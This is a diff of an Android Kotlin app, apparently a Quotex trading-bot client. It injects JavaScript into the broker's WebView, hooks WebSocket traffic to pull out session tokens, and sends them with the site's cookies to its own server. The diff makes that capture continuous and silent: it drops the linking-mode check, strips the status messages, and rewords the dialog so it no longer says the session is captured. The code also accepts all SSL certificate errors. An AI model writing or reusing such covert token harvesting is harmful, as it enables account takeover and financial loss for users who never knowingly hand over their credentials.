@@ -6,7 +6,6 @@ import android.content.SharedPreferences
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
-import android.media.RingtoneManager
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -56,14 +55,12 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnUnlink: Button
 
     private var currentTab = "settings"
-    private var linkingMode = false
     private lateinit var licenseKey: String
     private lateinit var prefs: SharedPreferences
     private var isLinked = false
     private var isLocked = false
     private var statsHandler: Handler? = null
-    private var successShown = false
-    private var successLock = false
+    private var isProcessingSSID = false // لمنع الإرسال المتكرر
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -77,10 +74,10 @@ class MainActivity : AppCompatActivity() {
     (function() {
         if (window.__oscarEarlyHook) return;
         window.__oscarEarlyHook = true;
-        function extractAndSend(text, tag) {
+        function extractAndSend(text) {
             try {
                 if (typeof text !== 'string' || text.length < 5) return;
-                var pats = [ /"session"\s*:\s*"([^"]+)"/, /"token"\s*:\s*"([^"]+)"/, /"ssid"\s*:\s*"([^"]+)"/ ];
+                var pats = [ /"session"\s*:\s*"([^"]+)"/, /"token"\s*:\s*"([^"]+)"/ ];
                 for (var i = 0; i < pats.length; i++) {
                     var m = text.match(pats[i]);
                     if (m && m[1] && m[1].length > 25) {
@@ -100,7 +97,7 @@ class MainActivity : AppCompatActivity() {
                     ws.addEventListener = function(type, listener, opts) {
                         if (type === 'message') {
                             return origAdd(type, function(ev) {
-                                if (typeof ev.data === 'string') extractAndSend(ev.data, 'WS_RECV');
+                                if (typeof ev.data === 'string') extractAndSend(ev.data);
                                 return listener(ev);
                             }, opts);
                         }
@@ -118,7 +115,7 @@ class MainActivity : AppCompatActivity() {
         if (window.WebSocket && window.WebSocket.prototype && window.WebSocket.prototype.send) {
             var origSend = window.WebSocket.prototype.send;
             window.WebSocket.prototype.send = function(data) {
-                if (typeof data === 'string') extractAndSend(data, 'WS_SEND');
+                if (typeof data === 'string') extractAndSend(data);
                 return origSend.apply(this, arguments);
             };
         }
@@ -138,7 +135,6 @@ class MainActivity : AppCompatActivity() {
                 if (ok) { setupUi(); showSettings() }
                 else {
                     prefs.edit().remove("license_key").apply()
-                    playSound(false)
                     Toast.makeText(this, "❌ $err", Toast.LENGTH_LONG).show()
                     showKeyDialog()
                 }
@@ -146,21 +142,11 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun playSound(success: Boolean) {
-        try {
-            val uri = RingtoneManager.getDefaultUri(
-                if (success) RingtoneManager.TYPE_NOTIFICATION else RingtoneManager.TYPE_ALARM
-            )
-            RingtoneManager.getRingtone(applicationContext, uri)?.play()
-        } catch (e: Exception) {}
-    }
-
     private fun showKeyDialog() {
         val container = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(50, 30, 50, 10)
         }
-        
         val input = EditText(this).apply {
             hint = "OSCAR-XXXX-XXXX-XXXX"
             setSingleLine()
@@ -190,14 +176,12 @@ class MainActivity : AppCompatActivity() {
                     if (ok) {
                         licenseKey = k
                         prefs.edit().putString("license_key", k).apply()
-                        playSound(true)
                         dialog.dismiss()
                         setupUi()
                         showSettings()
                     } else {
                         btn.isEnabled = true
                         btn.text = "متابعة"
-                        playSound(false)
                         Toast.makeText(this, "❌ $err", Toast.LENGTH_LONG).show()
                     }
                 }
@@ -322,7 +306,7 @@ class MainActivity : AppCompatActivity() {
         btnLink.setOnClickListener {
             AlertDialog.Builder(this@MainActivity)
                 .setTitle("🔗 ربط الحساب")
-                .setMessage("ستُفتح صفحة Quotex. سجّل دخولك، وسيتم التقاط الجلسة تلقائياً.")
+                .setMessage("ستُفتح صفحة Quotex. سجّل دخولك، وسيتم الربط تلقائياً.")
                 .setPositiveButton("متابعة") { _, _ -> showMarket() }
                 .setNegativeButton("إلغاء", null)
                 .show()
@@ -480,13 +464,13 @@ class MainActivity : AppCompatActivity() {
         currentTab = "market"
         settingsView.visibility = android.view.View.GONE
         webView.visibility = android.view.View.VISIBLE
-        statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
+        statusBar.text = "📈 السوق"
         updateTabButtons()
-        linkingMode = true
-        successShown = false
-        successLock = false
-        // تحميل الصفحة إذا لم تكن محملة، أو إعادة تحميلها إذا أردنا التقاط جلسة جديدة
-        webView.loadUrl("$QX_DOMAIN/ar/trade")
+        
+        // إذا لم تكن الصفحة محملة، حملها. لا نعيد التحميل في كل مرة للحفاظ على الجلسة
+        if (webView.url == null || !webView.url!!.contains("quotex.com")) {
+            webView.loadUrl("$QX_DOMAIN/ar/trade")
+        }
     }
 
     private fun updateTabButtons() {
@@ -512,15 +496,14 @@ class MainActivity : AppCompatActivity() {
                 withContext(Dispatchers.Main) {
                     if (!json.optBoolean("ok")) return@withContext
                     isLinked = json.optBoolean("linked")
-                    val email = json.optString("email", "")
                     
                     if (isLinked) {
-                        tvLinkStatus.text = "✅ الحساب مرتبط${if (email.isNotEmpty()) " — $email" else ""}"
+                        tvLinkStatus.text = "✅ الحساب مرتبط"
                         tvLinkStatus.setTextColor(Color.parseColor("#81c784"))
                         btnLink.visibility = android.view.View.GONE
                         btnUnlink.visibility = android.view.View.VISIBLE
                     } else {
-                        tvLinkStatus.text = "⚠️ الحساب غير مرتبط\nاذهب إلى تبويب السوق وسجّل الدخول"
+                        tvLinkStatus.text = "⚠️ الحساب غير مرتبط"
                         tvLinkStatus.setTextColor(Color.parseColor("#f0e0a0"))
                         btnLink.visibility = android.view.View.VISIBLE
                         btnUnlink.visibility = android.view.View.GONE
@@ -535,11 +518,8 @@ class MainActivity : AppCompatActivity() {
                         btnEnableCopy.visibility = android.view.View.GONE
                         btnEnableAuto.visibility = android.view.View.GONE
                         btnStop.visibility = android.view.View.VISIBLE
-                        if (copying) {
-                            tvLinkStatus.append("\n👥 النسخ مفعّل")
-                        } else if (auto) {
-                            tvLinkStatus.append("\n🤖 التداول الآلي مفعّل")
-                        }
+                        if (copying) tvLinkStatus.append("\n👥 النسخ مفعّل")
+                        else if (auto) tvLinkStatus.append("\n🤖 التداول الآلي مفعّل")
                     } else {
                         setFieldsEnabled(true)
                         btnEnableCopy.visibility = if (isLinked) android.view.View.VISIBLE else android.view.View.GONE
@@ -577,17 +557,14 @@ class MainActivity : AppCompatActivity() {
                 val json = JSONObject(res.body?.string() ?: "{}")
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
-                        playSound(true)
                         Toast.makeText(this@MainActivity, "✅ تم التفعيل", Toast.LENGTH_SHORT).show()
                         fetchUserInfo()
                     } else {
-                        playSound(false)
                         Toast.makeText(this@MainActivity, "❌ ${json.optString("error")}", Toast.LENGTH_LONG).show()
                     }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    playSound(false)
                     Toast.makeText(this@MainActivity, "خطأ: ${e.message}", Toast.LENGTH_LONG).show()
                 }
             }
@@ -605,11 +582,9 @@ class MainActivity : AppCompatActivity() {
                 val json = JSONObject(res.body?.string() ?: "{}")
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
-                        playSound(true)
                         Toast.makeText(this@MainActivity, "⛔ تم الإيقاف", Toast.LENGTH_SHORT).show()
                         fetchUserInfo()
                     } else {
-                        playSound(false)
                         Toast.makeText(this@MainActivity, "❌ ${json.optString("error")}", Toast.LENGTH_LONG).show()
                     }
                 }
@@ -631,17 +606,16 @@ class MainActivity : AppCompatActivity() {
                         client.newCall(req).execute()
                         
                         withContext(Dispatchers.Main) {
-                            // مسح الكوكيز والذاكرة المؤقتة للمتصفح بالكامل
+                            // مسح الكوكيز والذاكرة المؤقتة بالكامل
                             val cookieManager = CookieManager.getInstance()
                             cookieManager.removeAllCookies(null)
                             cookieManager.flush()
                             webView.clearCache(true)
                             webView.clearHistory()
-                            webView.loadUrl("about:blank")
+                            webView.loadUrl("about:blank") // تفريغ الصفحة
                             
-                            playSound(true)
                             fetchUserInfo()
-                            Toast.makeText(this@MainActivity, "تم فصل الحساب ومسح الجلسة", Toast.LENGTH_SHORT).show()
+                            Toast.makeText(this@MainActivity, "تم فصل الحساب", Toast.LENGTH_SHORT).show()
                         }
                     } catch (e: Exception) {
                         withContext(Dispatchers.Main) {
@@ -711,20 +685,28 @@ class MainActivity : AppCompatActivity() {
 
         webView.webViewClient = object : WebViewClient() {
             override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: android.net.http.SslError?) { h?.proceed() }
+            
             override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                 super.onPageStarted(view, url, favicon)
                 if (url?.contains("quotex.com") == true) view?.evaluateJavascript(EARLY_HOOK_JS, null)
             }
+            
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
                 if (url.contains("quotex.com")) {
                     view.evaluateJavascript(EARLY_HOOK_JS, null)
-                    if (linkingMode && (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard"))) {
-                        if (!successLock) {
-                            statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري البحث عن SSID..."
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                if (linkingMode && !successShown) statusBar.text = "⚠️ لم نتمكن من التقاط SSID. حاول مجدداً."
-                            }, 15000)
+                    
+                    // إذا كان في صفحة تسجيل الدخول، فهذا يعني أنه مسجل خروجه
+                    if (url.contains("/sign-in")) {
+                        if (isLinked) {
+                            // المستخدم سجل خروجه من المتصفح، نقوم بفصل الحساب تلقائياً من السيرفر
+                            CoroutineScope(Dispatchers.IO).launch {
+                                try {
+                                    val req = Request.Builder().url("$BASE_URL/api/app/unlink/$licenseKey").post("{}".toRequestBody("application/json".toMediaType())).build()
+                                    client.newCall(req).execute()
+                                    withContext(Dispatchers.Main) { fetchUserInfo() }
+                                } catch (e: Exception) {}
+                            }
                         }
                     }
                 }
@@ -733,8 +715,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun sendToServer(ssid: String) {
-        if (!linkingMode || successLock || ssid.length < 25) return
-        statusBar.text = "🔗 جاري التحقق من SSID (${ssid.length} حرف)..."
+        if (isProcessingSSID || ssid.length < 25) return
+        isProcessingSSID = true
         val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
 
         CoroutineScope(Dispatchers.IO).launch {
@@ -751,20 +733,12 @@ class MainActivity : AppCompatActivity() {
 
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
-                        successLock = true
-                        successShown = true
-                        linkingMode = false
-                        statusBar.text = "✅ تم ربط الحساب بنجاح!"
-                        playSound(true)
-                        Toast.makeText(this@MainActivity, "✅ تم الربط", Toast.LENGTH_LONG).show()
-                        Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
-                    } else {
-                        val err = json.optString("error", "خطأ")
-                        statusBar.text = "⚠️ فشل: $err"
+                        fetchUserInfo() // تحديث الواجهة بصمت
                     }
+                    isProcessingSSID = false
                 }
             } catch (e: Exception) {
-                withContext(Dispatchers.Main) { statusBar.text = "⚠️ خطأ اتصال: ${e.message}" }
+                withContext(Dispatchers.Main) { isProcessingSSID = false }
             }
         }
     }
@@ -773,12 +747,8 @@ class MainActivity : AppCompatActivity() {
         @JavascriptInterface
         fun onSsid(ssid: String) {
             if (ssid.length < 25) return
-            runOnUiThread {
-                if (linkingMode && !successLock) {
-                    statusBar.text = "🎯 تم التقاط SSID! (${ssid.length} حرف)"
-                    sendToServer(ssid)
-                }
-            }
+            // إرسال بصمت في الخلفية، بدون تحديث الواجهة
+            sendToServer(ssid)
         }
     }
 
